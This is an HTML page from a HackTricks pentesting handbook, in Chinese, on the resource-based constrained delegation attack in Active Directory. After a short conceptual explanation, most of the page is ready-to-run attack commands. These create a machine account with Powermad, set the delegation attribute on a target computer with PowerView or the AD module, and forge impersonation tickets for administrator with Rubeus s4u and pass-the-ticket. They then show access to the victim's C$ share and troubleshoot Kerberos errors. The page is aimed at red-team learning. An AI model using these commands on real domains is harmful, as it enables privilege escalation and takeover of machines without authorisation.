@@ -1,0 +1,329 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Resource-based Constrained Delegation</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="基于资源的受限委托"><a class="header" href="#基于资源的受限委托">基于资源的受限委托</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<p>{% embed url="https://websec.nl/" %}</p>
+<h2 id="基于资源的受限委托基础"><a class="header" href="#基于资源的受限委托基础">基于资源的受限委托基础</a></h2>
+<p>这与基本的 <a href="constrained-delegation.html">受限委托</a> 类似，但<strong>不是</strong>给一个<strong>对象</strong>权限以<strong>代表任何用户对服务进行 impersonate</strong>。基于资源的受限委托<strong>设置</strong>在<strong>对象中谁能够对其 impersonate 任何用户</strong>。</p>
+<p>在这种情况下，受限对象将具有一个名为 <em><strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong></em> 的属性，包含可以对其 impersonate 任何其他用户的用户的名称。</p>
+<p>与其他委托的一个重要区别是，任何对计算机帐户具有<strong>写权限</strong>的用户（_GenericAll/GenericWrite/WriteDacl/WriteProperty 等）都可以设置 <em><strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong></em>（在其他形式的委托中，您需要域管理员权限）。</p>
+<h3 id="新概念"><a class="header" href="#新概念">新概念</a></h3>
+<p>在受限委托中提到，用户的 <em>userAccountControl</em> 值中的 <strong><code>TrustedToAuthForDelegation</code></strong> 标志是执行 <strong>S4U2Self</strong> 所需的。但这并不完全正确。<br />
+实际上，即使没有该值，如果您是<strong>服务</strong>（具有 SPN），您也可以对任何用户执行 <strong>S4U2Self</strong>，但是，如果您<strong>具有 <code>TrustedToAuthForDelegation</code></strong>，返回的 TGS 将是<strong>可转发的</strong>，如果您<strong>没有</strong>该标志，返回的 TGS <strong>将不会</strong>是<strong>可转发的</strong>。</p>
+<p>然而，如果在 <strong>S4U2Proxy</strong> 中使用的 <strong>TGS</strong> <strong>不是可转发的</strong>，尝试滥用<strong>基本受限委托</strong>将<strong>不起作用</strong>。但如果您尝试利用<strong>基于资源的受限委托，它将有效</strong>（这不是漏洞，而是一个特性，显然）。</p>
+<h3 id="攻击结构"><a class="header" href="#攻击结构">攻击结构</a></h3>
+<blockquote>
+<p>如果您对<strong>计算机</strong>帐户具有<strong>写等效权限</strong>，则可以在该计算机上获得<strong>特权访问</strong>。</p>
+</blockquote>
+<p>假设攻击者已经对受害者计算机具有<strong>写等效权限</strong>。</p>
+<ol>
+<li>攻击者<strong>破坏</strong>一个具有<strong>SPN</strong>的帐户或<strong>创建一个</strong>（“服务 A”）。请注意，<strong>任何</strong><em>管理员用户_在没有其他特殊权限的情况下可以<strong>创建</strong>最多 10 个<strong>计算机对象（</strong></em><strong>MachineAccountQuota</strong>_**）并为其设置一个 <strong>SPN</strong>。因此，攻击者可以创建一个计算机对象并设置一个 SPN。</li>
+<li>攻击者<strong>滥用</strong>其对受害者计算机（ServiceB）的写权限，以配置<strong>基于资源的受限委托，允许 ServiceA 对该受害者计算机（ServiceB）进行 impersonate 任何用户</strong>。</li>
+<li>攻击者使用 Rubeus 执行<strong>完整的 S4U 攻击</strong>（S4U2Self 和 S4U2Proxy），从服务 A 到服务 B，针对具有<strong>对服务 B 的特权访问</strong>的用户。
+<ol>
+<li>S4U2Self（来自被破坏/创建的帐户的 SPN）：请求<strong>管理员的 TGS 给我</strong>（不可转发）。</li>
+<li>S4U2Proxy：使用上一步的<strong>不可转发 TGS</strong>请求从<strong>管理员</strong>到<strong>受害主机</strong>的<strong>TGS</strong>。</li>
+<li>即使您使用的是不可转发的 TGS，由于您正在利用基于资源的受限委托，它将有效。</li>
+<li>攻击者可以<strong>传递票证</strong>并<strong>冒充</strong>用户以获得对<strong>受害者 ServiceB</strong>的<strong>访问</strong>。</li>
+</ol>
+</li>
+</ol>
+<p>要检查域的 <em><strong>MachineAccountQuota</strong></em>，您可以使用：</p>
+<pre><code class="language-powershell">Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
+</code></pre>
+<h2 id="攻击"><a class="header" href="#攻击">攻击</a></h2>
+<h3 id="创建计算机对象"><a class="header" href="#创建计算机对象">创建计算机对象</a></h3>
+<p>您可以使用 <a href="https://github.com/Kevin-Robertson/Powermad">powermad</a> 在域内创建计算机对象**:**</p>
+<pre><code class="language-powershell">import-module powermad
+New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+# Check if created
+Get-DomainComputer SERVICEA
+</code></pre>
+<h3 id="配置基于资源的受限委派"><a class="header" href="#配置基于资源的受限委派">配置基于资源的受限委派</a></h3>
+<p><strong>使用 activedirectory PowerShell 模块</strong></p>
+<pre><code class="language-powershell">Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
+Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
+</code></pre>
+<p><strong>使用 powerview</strong></p>
+<pre><code class="language-powershell">$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+#Check that it worked
+Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+</code></pre>
+<h3 id="执行完整的-s4u-攻击"><a class="header" href="#执行完整的-s4u-攻击">执行完整的 S4U 攻击</a></h3>
+<p>首先，我们创建了新的计算机对象，密码为 <code>123456</code>，因此我们需要该密码的哈希值：</p>
+<pre><code class="language-bash">.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
+</code></pre>
+<p>这将打印该账户的 RC4 和 AES 哈希。<br />
+现在，可以执行攻击：</p>
+<pre><code class="language-bash">rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:&lt;aes256 hash&gt; /aes128:&lt;aes128 hash&gt; /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
+</code></pre>
+<p>您可以通过使用 Rubeus 的 <code>/altservice</code> 参数仅询问一次来生成更多票证：</p>
+<pre><code class="language-bash">rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:&lt;AES 256 hash&gt; /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
+</code></pre>
+<p>{% hint style="danger" %}
+注意，用户有一个属性叫做“<strong>无法被委托</strong>”。如果用户的此属性为 True，您将无法冒充他。此属性可以在 bloodhound 中查看。
+{% endhint %}</p>
+<h3 id="访问"><a class="header" href="#访问">访问</a></h3>
+<p>最后一条命令将执行 <strong>完整的 S4U 攻击并将 TGS</strong> 从管理员注入到受害主机的 <strong>内存</strong> 中。<br />
+在此示例中，请求了来自管理员的 <strong>CIFS</strong> 服务的 TGS，因此您将能够访问 <strong>C$</strong>：</p>
+<pre><code class="language-bash">ls \\victim.domain.local\C$
+</code></pre>
+<h3 id="滥用不同的服务票证"><a class="header" href="#滥用不同的服务票证">滥用不同的服务票证</a></h3>
+<p>了解<a href="silver-ticket.html#available-services"><strong>可用的服务票证在这里</strong></a>。</p>
+<h2 id="kerberos-错误"><a class="header" href="#kerberos-错误">Kerberos 错误</a></h2>
+<ul>
+<li><strong><code>KDC_ERR_ETYPE_NOTSUPP</code></strong>: 这意味着 kerberos 配置为不使用 DES 或 RC4，而您仅提供了 RC4 哈希。至少向 Rubeus 提供 AES256 哈希（或同时提供 rc4、aes128 和 aes256 哈希）。示例: <code>[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())</code></li>
+<li><strong><code>KRB_AP_ERR_SKEW</code></strong>: 这意味着当前计算机的时间与 DC 的时间不同，kerberos 无法正常工作。</li>
+<li><strong><code>preauth_failed</code></strong>: 这意味着给定的用户名 + 哈希无法登录。您可能忘记在生成哈希时在用户名中放入“$”（<code>.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local</code>）</li>
+<li><strong><code>KDC_ERR_BADOPTION</code></strong>: 这可能意味着：</li>
+<li>您尝试模拟的用户无法访问所需的服务（因为您无法模拟它或因为它没有足够的权限）</li>
+<li>请求的服务不存在（如果您请求 winrm 的票证但 winrm 没有运行）</li>
+<li>创建的 fakecomputer 已失去对易受攻击服务器的权限，您需要将其恢复。</li>
+</ul>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
+<li><a href="https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object</a></li>
+<li><a href="https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/">https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/</a></li>
+</ul>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<p>{% embed url="https://websec.nl/" %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/rdp-sessions-abuse.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/security-descriptors.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/rdp-sessions-abuse.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/security-descriptors.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
